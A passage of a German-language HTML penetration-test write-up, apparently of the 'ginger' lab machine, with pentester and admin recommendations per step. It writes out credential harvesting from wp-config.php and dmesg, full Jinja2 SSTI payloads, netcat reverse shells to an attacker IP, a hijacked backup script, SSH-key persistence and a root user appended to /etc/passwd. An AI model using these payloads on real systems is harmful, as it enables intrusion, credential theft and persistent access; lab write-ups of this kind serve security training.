+                    <div class="prompt">www-data@ginger:/var/www/html/wordpress/wp-content/themes/twentynineteen$ <span class="command">ls -la /home</span></div>
+                    <pre>
+total 20
+drwxr-xr-x  5 root      root      4096 May 21  2021 .
+drwxr-xr-x 18 root      root      4096 May 19  2021 ..
+drwxr-xr--  5 <span class="command">caroline</span>  <span class="command">webmaster</span> 4096 May 25  2021 caroline
+drwxr-xr-x  4 <span class="command">sabrina</span>   <span class="command">sabrina</span>   4096 May 25  2021 sabrina
+drwx------  4 <span class="command">webmaster</span> <span class="command">webmaster</span> 4096 May 25  2021 webmaster</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die WordPress-Konfigurationsdatei `wp-config.php` wird ausgelesen, um die Datenbank-Zugangsdaten zu finden, die WordPress selbst verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält die Zugangsdaten für den MySQL-Benutzer `wordpress_user` mit dem Passwort `<span class="password">greatpassword123!!!</span>` für die Datenbank `wordpress_db`. Dies sind andere Zugangsdaten als die zuvor über SQL-Injection gefundenen (`webmaster`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie diese Zugangsdaten. Versuchen Sie, ob dieses Passwort für andere Benutzer (z.B. `sabrina`, `caroline`, `root`) auf dem System wiederverwendet wurde (z.B. per SSH oder `su`). Überprüfen Sie die Berechtigungen des Datenbankbenutzers `wordpress_user` in der Datenbank.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer. Speichern Sie `wp-config.php` außerhalb des Web-Roots oder schützen Sie die Datei zumindest mit restriktiven Dateiberechtigungen (z.B. `400` oder `440`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@ginger:/var/www/html/wordpress$ <span class="command">cat wp-config.php</span></div>
+                    <pre>
+[...]
+define( 'DB_NAME', '<span class="command">wordpress_db</span>' );
+
+/** MySQL database username */
+define( 'DB_USER', '<span class="command">wordpress_user</span>' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '<span class="password">greatpassword123!!!</span>' );
+[...]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Berechtigung für `www-data` wird genutzt, um `/usr/bin/sl` auszuführen. Danach werden Dateien im Home-Verzeichnis von `sabrina` untersucht: Auflistung, `strings` auf eine Bilddatei und Auslesen einer Textdatei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ausführen von `sudo sl` hat keinen offensichtlichen Effekt. `strings image.jpg` liefert keine sichtbare Ausgabe (oder sie wurde weggelassen). Die Datei `password.txt` enthält einen Hinweis, dass das Passwort für `sabrina` irgendwo im Format `sabrina:password` notiert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Hinweis in `password.txt` ist wichtig. Suchen Sie nach Dateien oder Ausgaben, die diesem Format entsprechen. Da `strings` nichts ergab, prüfen Sie andere potenzielle Speicherorte für Passwörter oder Notizen im Home-Verzeichnis von `sabrina` oder im System (z.B. Prozessspeicher, Logdateien, Kernel-Meldungen mit `dmesg`).
+            <br><strong>Empfehlung (Admin):</strong> Schulen Sie Benutzer darin, Passwörter niemals unsicher zu speichern. Verwenden Sie Passwort-Manager. Entfernen Sie unnötige Hinweise oder Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@ginger:/home/sabrina$ <span class="command">sudo /usr/bin/sl</span></div>
+                    <pre><span class="comment">[Ausgabe von sl - die Dampflokomotive]</span></pre>
+                    <div class="prompt">www-data@ginger:/home/sabrina$ <span class="command">ls -lart</span></div>
+                    <pre><span class="comment">[Datei-Listing von /home/sabrina]</span></pre>
+                    <div class="prompt">www-data@ginger:/home/sabrina$ <span class="command">strings image.jpg</span></div>
+                    <pre><span class="comment">[Keine relevante Ausgabe im Text]</span></pre>
+                    <div class="prompt">www-data@ginger:/home/sabrina$ <span class="command">cat password.txt</span></div>
+                    <pre>
+I forgot my password again...
+I wrote it down somewhere in this form: sabrina:password
+but I don't know where... I have to search in my memory
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `dmesg` zeigt die Kernel-Ringpuffer-Meldungen an. Diese Ausgabe wird mit `grep` nach der Zeichenkette "pass" durchsucht, um Hinweise auf Passwörter zu finden, die möglicherweise während des Bootvorgangs oder von Treibern/Modulen protokolliert wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Ein Volltreffer!</span> `dmesg` enthält die Zeile `<span class="password">sabrina:dontforgetyourpasswordbitch</span>`. Dies entspricht exakt dem Hinweisformat aus `password.txt` und enthüllt das Passwort für den Benutzer `sabrina`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort (`dontforgetyourpasswordbitch`), um sich als Benutzer `sabrina` per SSH anzumelden (`ssh sabrina@192.168.2.135`). Dies ermöglicht einen Wechsel vom `www-data`-Kontext zu einem echten Benutzerkonto.
+            <br><strong>Empfehlung (Admin):</strong> Passwörter oder sensible Informationen sollten niemals in Kernel-Meldungen oder Systemprotokollen erscheinen. Überprüfen Sie den Quellcode oder die Konfiguration der Komponente, die diese Meldung verursacht hat, und beheben Sie das Problem. Bereinigen Sie vorhandene Logs oder den `dmesg`-Puffer, wenn möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@ginger:/home/sabrina$ <span class="command">dmesg | grep pass</span></div>
+                    <pre>
+[    0.607106] x86/mm: Checked W+X mappings: passed, no W+X pages found.
+[    3.461684] [drm]   Cursor bypass 2.
+[    6.922812] <span class="password">sabrina:dontforgetyourpasswordbitch</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Entdeckung des Passworts für `sabrina` wird versucht, sich per SSH als dieser Benutzer anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich (impliziert, da der Prompt zu `sabrina@ginger:~$` wechselt). Dies stellt einen erfolgreichen Lateral-Movement-Schritt dar, weg vom eingeschränkten `www-data`-Benutzer hin zu einem Benutzer mit einem Home-Verzeichnis und potenziell anderen Berechtigungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun Enumerationsschritte als Benutzer `sabrina` durch:
+            <ol><li>Prüfen Sie die `sudo`-Rechte mit `sudo -l`.</li><li>Untersuchen Sie das Home-Verzeichnis von `sabrina` genauer.</li><li>Suchen Sie nach SUID-Dateien, Cronjobs oder anderen potenziellen Wegen zur Rechteausweitung von `sabrina` aus.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzerpasswörter stark und einzigartig sind und nicht leicht durch Informationslecks (wie in `dmesg`) kompromittiert werden können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">ssh sabrina@192.168.2.135</span></div>
+                    <pre>
+Password: <span class="comment">(Passwort 'dontforgetyourpasswordbitch' eingegeben)</span>
+[...] <span class="comment">(Login Banner)</span>
+<span class="prompt">sabrina@ginger:~$ </span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `sabrina` werden die `sudo`-Rechte überprüft. Anschließend wird der erlaubte `sudo`-Befehl ausgeführt: `sudo -u webmaster /usr/bin/python /opt/app.py`. Dies startet das Python-Skript `/opt/app.py` als Benutzer `webmaster`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sabrina` darf das Python-Skript `/opt/app.py` als Benutzer `webmaster` ohne Passwort ausführen. Das Skript startet eine Flask-Webanwendung im Debug-Modus auf `127.0.0.1:5000`. Der Debug-Modus von Flask ist extrem gefährlich, da er oft eine interaktive Debugging-Konsole im Browser ermöglicht, die zur Ausführung beliebigen Python-Codes (und damit Systembefehlen) im Kontext des ausführenden Benutzers (`webmaster`) missbraucht werden kann. Der angezeigte Debugger-PIN ist für den Zugriff auf diese Konsole erforderlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Richten Sie eine SSH-Portweiterleitung ein, um vom Angreifer-System auf den Flask-Dienst zuzugreifen: `ssh -L 5000:127.0.0.1:5000 sabrina@192.168.2.135`.</li><li>Greifen Sie im Browser auf `http://127.0.0.1:5000` zu.</li><li>Lösen Sie einen Fehler in der Anwendung aus (z.B. durch ungültige Eingabe), um die Debugging-Konsole zu erreichen.</li><li>Geben Sie den Debugger-PIN (`323-580-316`) ein.</li><li>Führen Sie in der Konsole Python-Code aus, um eine Reverse Shell als Benutzer `webmaster` zu erhalten (z.B. `import os; os.system('nc 192.168.2.140 1234 -e /bin/bash')`) oder nutzen Sie Server-Side Template Injection (SSTI), falls die Anwendung Templates verwendet.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Führen Sie Webanwendungen niemals im Debug-Modus in einer Produktions- oder produktionsnahen Umgebung aus.</li><li>Beschränken Sie `sudo`-Rechte. Hier wäre es sicherer gewesen, wenn `sabrina` das Skript nur als `sabrina` hätte ausführen dürfen.</li><li>Überprüfen Sie den Code von `/opt/app.py` auf weitere Schwachstellen.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sabrina@ginger:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for sabrina on ginger:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sabrina may run the following commands on ginger:
+    <span class="password">(webmaster) NOPASSWD: /usr/bin/python /opt/app.py</span></pre>
+                    <div class="prompt">sabrina@ginger:~$ <span class="command">sudo -u webmaster /usr/bin/python /opt/app.py</span></div>
+                    <pre>
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   <span class="password">WARNING: This is a development server. Do not use it in a production deployment.</span>
+   Use a production WSGI server instead.
+ * <span class="password">Debug mode: on</span>
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * <span class="password">Debugger is active!</span>
+ * <span class="password">Debugger PIN: 323-580-316</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Portweiterleitung wird eingerichtet (`ssh -L 5000:localhost:5000 ...`), um den lokalen Flask-Dienst vom Angreifer-System aus zu erreichen. Anschließend werden verschiedene URLs gezeigt, die im Browser aufgerufen werden (via `127.0.0.1:5000`). Diese URLs demonstrieren eine Server-Side Template Injection (SSTI)-Schwachstelle im `name`-Parameter der Flask-Anwendung.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Flask-Anwendung ist anfällig für SSTI.
+             <ul><li>`?name=ben`: Normale Ausgabe.</li><li>`?name={{233233}}`: Gibt `233233` aus, bestätigt Template-Auswertung.</li><li>Langer Payload (`?name=%7B%25%20for%20c%20...%20read()%27)%20%7D%7D`): Dies ist ein typischer Jinja2-SSTI-Payload, der versucht, durch die Objekt-Hierarchie zu navigieren, um `os.popen('id').read()` auszuführen. Die Ausgabe dieses Befehls (`uid=1001(webmaster)...`) wird in der Webseitenantwort angezeigt.</li><li>Reverse-Shell-Payload (`?name={{request...bash%27).read()}}`): Ein weiterer SSTI-Payload, der direkt eine Netcat-Reverse-Shell zum Angreifer (`192.168.2.140:1234`) startet.</li></ul>
+             Die SSTI-Schwachstelle erlaubt die Ausführung beliebiger Befehle als Benutzer `webmaster`, ohne den Flask-Debugger-PIN verwenden zu müssen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Starten Sie einen Netcat-Listener auf Port 1234 (`nc -lvnp 1234`).</li><li>Rufen Sie die URL mit dem Reverse-Shell-SSTI-Payload im Browser auf: `http://127.0.0.1:5000/?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27nc%20192.168.2.140%201234%20-e%20/bin/bash%27).read()}}`</li><li>Sie sollten eine Shell als Benutzer `webmaster` erhalten.</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Beheben Sie die SSTI-Schwachstelle in der Flask-Anwendung (`/opt/app.py`), indem Sie Benutzereingaben vor der Übergabe an die Template-Engine ordnungsgemäß validieren und escapen. Verwenden Sie Kontexte, die keine gefährlichen Objekte verfügbar machen.</li><li>Führen Sie die Anwendung nicht im Debug-Modus aus.</li><li>Beschränken Sie die Berechtigungen des `webmaster`-Benutzers.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">ssh -L 5000:localhost:5000 sabrina@192.168.2.135 -p 22</span></div>
+                    <pre><span class="comment">[SSH-Verbindung wird aufgebaut]</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">Browser-Aufrufe (SSTI-Exploitation):</span>
+
+<span class="command">http://127.0.0.1:5000/</span>
+<span class="command">http://127.0.0.1:5000/?name=ben</span>
+<span class="command">http://127.0.0.1:5000/?name={{233233}}</span>
+
+<span class="comment"># Führt 'id' aus und zeigt die Ausgabe auf der Webseite an:</span>
+<span class="command">http://127.0.0.1:5000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</span>
+
+<span class="comment"># Startet eine Reverse Shell zu 192.168.2.140:1234:</span>
+<span class="command">http://127.0.0.1:5000/?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27nc%20192.168.2.140%201234%20-e%20/bin/bash%27).read()}}</span>
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Diese Befehle werden im Kontext des `webmaster`-Benutzers ausgeführt (wahrscheinlich über die durch SSTI erlangte Shell). Ein Reverse-Shell-Skript wird in `/tmp/backup.sh` erstellt. Anschließend wird versucht, eine vorhandene `backup/backup.sh`-Datei im Home-Verzeichnis von `caroline` zu löschen und die neue Version dorthin zu kopieren. Der `rm`-Befehl fragt nach Bestätigung, da die Datei schreibgeschützt ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Plan ist, ein Skript im Home-Verzeichnis von `caroline` zu überschreiben, das vermutlich regelmäßig (z.B. per Cronjob oder bei Login) von `caroline` ausgeführt wird. Da `webmaster` zur Gruppe `webmaster` gehört und `/home/caroline` der Gruppe `webmaster` gehört und Gruppen-Schreibrechte hat (`drwxr-xr--` ist falsch, es müsste `drwxrwx---` oder `drwxrwxr-x` sein - Annahme: Schreibrechte für Gruppe `webmaster` existieren auf `backup`), kann `webmaster` die Datei manipulieren. Wenn `caroline` dieses Skript ausführt, erhält der Angreifer eine Shell als `caroline`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Bestätigen Sie die Löschabfrage mit `yes`.</li><li>Stellen Sie sicher, dass der Kopiervorgang erfolgreich ist.</li><li>Starten Sie einen Netcat-Listener auf Port 1234 (`nc -lvnp 1234`).</li><li>Warten Sie, bis `caroline` das Skript `backup/backup.sh` ausführt (dies könnte automatisch geschehen oder manuelles Auslösen erfordern, falls der Mechanismus bekannt ist).</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Überprüfen Sie die Berechtigungen von Home-Verzeichnissen und darin enthaltenen Skripten. Benutzer sollten normalerweise keine Schreibrechte auf Dateien oder Verzeichnisse anderer Benutzer haben, es sei denn, es ist explizit erforderlich und sicher implementiert.</li><li>Überprüfen Sie Cronjobs und andere automatisierte Aufgaben, die Skripte aus Home-Verzeichnissen ausführen, auf Sicherheitsrisiken.</li><li>Vermeiden Sie es, Skripte aus potenziell manipulierbaren Speicherorten auszuführen.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">webmaster@ginger:/home/caroline$ <span class="command">echo 'nc 192.168.2.140 1234 -e /bin/bash' > /tmp/backup.sh</span></div>
+                    <div class="prompt">webmaster@ginger:/home/caroline$ <span class="command">rm backup/backup.sh</span></div>
+                    <pre>rm: remove write-protected regular file 'backup/backup.sh'? yes</pre>
+                    <div class="prompt">webmaster@ginger:/home/caroline$ <span class="command">cp /tmp/backup.sh backup/</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 1234 empfängt eine Verbindung vom Zielsystem. Die `id` und `pwd` Befehle werden ausgeführt, und die `user.txt` wird gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit war erfolgreich. Das manipulierte `backup.sh`-Skript wurde vom Benutzer `caroline` ausgeführt, was zu einer Reverse Shell als `caroline` (UID 1002) führte. Die User-Flag `<span class="password">f65aaadaeeb04adaccba45d7babf5f8c</span>` wird aus `/home/caroline/user.txt` ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Sie haben nun Zugriff als `caroline`. Notieren Sie die User-Flag.</li><li>Führen Sie Enumeration als `caroline` durch: `sudo -l`, SUID-Binaries, Cronjobs, Dateisystem durchsuchen.</li><li>Suchen Sie nach dem finalen Weg zur Rechteausweitung auf Root.</li></ol>
+            <strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlungen zu Dateiberechtigungen und unsicheren Skriptausführungen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                    <pre>
+listening on [any] 1234 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.131] 54698</span>
+<span class="prompt">$ </span><span class="command">id</span>
+<span class="password">uid=1002(caroline) gid=1002(caroline) groups=1002(caroline)</span>
+<span class="prompt">$ </span><span class="command">pwd</span>
+/home/caroline
+<span class="prompt">$ </span><span class="command">cat user.txt</span>
+<span class="password">f65aaadaeeb04adaccba45d7babf5f8c</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Text bricht hier kurz ab ("abgebrochen..."). Danach wird gezeigt, wie der öffentliche SSH-Schlüssel des Angreifers in die Datei `authorized_keys` des `caroline`-Benutzers geschrieben wird. Dies geschieht in der zuvor erhaltenen `caroline`-Shell (die mit `python3 -c 'import pty...'` stabilisiert und mit `export TERM=xterm` verbessert wurde).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine Methode, um persistenten Zugriff als Benutzer `caroline` zu erlangen. Statt sich auf die Reverse Shell zu verlassen, kann sich der Angreifer nun direkt per SSH mit seinem privaten Schlüssel als `caroline` anmelden. Der anschließende SSH-Login vom Angreifer-System bestätigt, dass dies funktioniert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die stabilere SSH-Verbindung für die weitere Enumeration als `caroline`.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an `.ssh/authorized_keys`-Dateien. Beschränken Sie den SSH-Zugriff auf notwendige Benutzer und verwenden Sie nach Möglichkeit sicherere Authentifizierungsmethoden (z.B. 2FA).</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">[... Shell wird stabilisiert ...]</span></pre>
+                    <div class="prompt">caroline@ginger:~$ <span class="command">mkdir .ssh</span></div>
+                    <div class="prompt">caroline@ginger:~$ <span class="command">cd .ssh</span></div>
+                    <div class="prompt">caroline@ginger:~/.ssh$ <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD6iwCfkt5ps5VHhY13FbW1JQh/iNT/vp+xSDB2+bKqnBIO0mFxzD7RFsuRtFyDQuHB4c2q06kSBF/yIaP4PQGW8tEY634DkXFI0Q7h4ll4LCL/rtwvx1CxLqxP+94iPqOXFjdRDquet50njrlslRGLSp+ptQzq23dH9s75gTJOW/KDAcCiuY2noN7WHabsz0XbR3z40NFGCezeYDzYbSnbPtMx5HSAlT/sB3chZWgltVwy96zJ81Vvwd41fsugeMIFxK0+BLxynPGKHBBOd84f11T5OF+Zhw9gMoHhCeAcHjYZ4Wpp3pydZYREPRM5Un+MqxFnEpo7GctIIvi6OYFCjSFUn3ih0udX4q+TeCID4oXrAfgu8YWWvM+w4vF5NedEisAJ2yPoraEyJr//HphqgrpWZnuTx4sHcocJNjPscTdvubuicXr0fqbVtpFWoXj5EzdpdbQA52cMBumJy/IEH5gt2n5gLcIW/zaagH4GyhA5JvMZNgGaULOP1BfCMos=" > authorized_keys</span></div>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh caroline@192.168.2.131</span></div>
+                     <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="comment">(Passphrase eingegeben)</span>
+Linux ginger 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="prompt">caroline@ginger:~$ </span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root Exploit)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `caroline` wird zuerst mit `openssl passwd -1` ein Passwort-Hash für das Passwort "ben" erzeugt (dieser Schritt scheint nicht direkt für den Exploit verwendet zu werden, möglicherweise eine Vorbereitung oder ein Test). Dann wird der Befehl `sudo /srv/code &` im Hintergrund gestartet. Unmittelbar danach wird versucht, eine Zeile zur Datei `/etc/passwd` hinzuzufügen. Diese Zeile definiert einen neuen Benutzer `hacker` mit UID 0 (Root), GID 0, Home-Verzeichnis `/root`, Shell `/bin/bash` und einem Passwort-Hash (`$1$KZwfflz5$3poJyobFRzKWbLrS8J7N0.`, der MD5-Crypt-Hash für "ben"). Schließlich wird mit `su hacker` versucht, zu diesem neuen Benutzer zu wechseln, wobei das Passwort `ben` eingegeben wird. Nach erfolgreichem Wechsel wird die Root-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Die finale Rechteausweitung auf Root ist erfolgreich!</span> Der Schlüssel ist der Befehl `sudo /srv/code &`. Es wird angenommen, dass dieser Befehl (den `caroline` offenbar per `sudo` ausführen darf - `sudo -l` Ausgabe fehlt hier aber!) für kurze Zeit (ca. 5 Sekunden laut Text) die Datei `/etc/passwd` schreibbar macht. Der `echo ... >> /etc/passwd`-Befehl nutzt dieses kurze Zeitfenster, um den Root-Benutzer `hacker` hinzuzufügen. Der anschließende `su hacker`-Befehl mit dem Passwort `ben` funktioniert, weil der entsprechende Hash in `/etc/passwd` steht und der Benutzer UID 0 hat. Die Root-Flag `<span class="password">ae426c9d237d676044e5cd8e8af9ef7f</span>` wird gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Dokumentieren Sie diesen ungewöhnlichen Exploit-Pfad (Race Condition durch `/srv/code`, Hinzufügen zu `/etc/passwd`).</li><li>Notieren Sie die Root-Flag.</li><li>Entfernen Sie den hinzugefügten Benutzer `hacker` aus `/etc/passwd`, um Spuren zu beseitigen (`sed -i '/hacker/d' /etc/passwd`).</li><li>Beenden Sie den `/srv/code`-Prozess, falls er noch läuft.</li><li>Bereinigen Sie andere Spuren (SSH-Schlüssel, hochgeladene Skripte).</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Untersuchen Sie den Befehl `/srv/code` und entfernen oder korrigieren Sie ihn sofort. Programme dürfen niemals kritische Systemdateien wie `/etc/passwd` auch nur kurzzeitig schreibbar machen.</li><li>Überprüfen Sie die `sudo`-Berechtigungen für `caroline` und entfernen Sie die Erlaubnis, `/srv/code` auszuführen.</li><li>Überwachen Sie `/etc/passwd` und `/etc/shadow` auf unbefugte Änderungen (z.B. mit Tripwire oder AIDE).</li><li>Stellen Sie sicher, dass keine Benutzer mit UID 0 außer `root` existieren.</li><li>Entfernen Sie den bösartigen `hacker`-Eintrag aus `/etc/passwd`.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">caroline@ginger:~$ <span class="command">openssl passwd -1</span></div>
+                    <pre>Password: <span class="comment">(Passwort 'ben' eingegeben)</span>
+Verifying - Password: <span class="comment">(Passwort 'ben' erneut eingegeben)</span>
+$1$KZwfflz5$3poJyobFRzKWbLrS8J7N0.</pre> <span class="comment">(Hash für 'ben')</span>
+
+                    <div class="prompt">caroline@ginger:~$ <span class="command">sudo /srv/code &</span></div>
+                    <pre>[1] 1113</pre>
+                    <div class="prompt">caroline@ginger:~$ <span class="command">echo 'hacker:$1$KZwfflz5$3poJyobFRzKWbLrS8J7N0.:0:0:root:/root:/bin/bash' >> /etc/passwd</span></div>
+                    <div class="prompt">caroline@ginger:~$ <span class="command">su hacker</span></div>
+                    <pre>Password: <span class="comment">(Passwort 'ben' eingegeben)</span></pre>
+                    <div class="prompt">root@ginger:/home/caroline# <span class="command">id</span></div>
+                    <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                    <div class="prompt">root@ginger:/home/caroline# <span class="command">cat /root/root.txt</span></div> <span class="comment">(Pfad angenommen)</span>
+                    <pre><span class="password">ae426c9d237d676044e5cd8e8af9ef7f</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/caroline/user.txt</div>
+                     <div class="flag-value"><span class="password">f65aaadaeeb04adaccba45d7babf5f8c</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">ae426c9d237d676044e5cd8e8af9ef7f</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: [Datum nicht im Text spezifiziert]</p>
+    </footer>
+</body>
+</html>
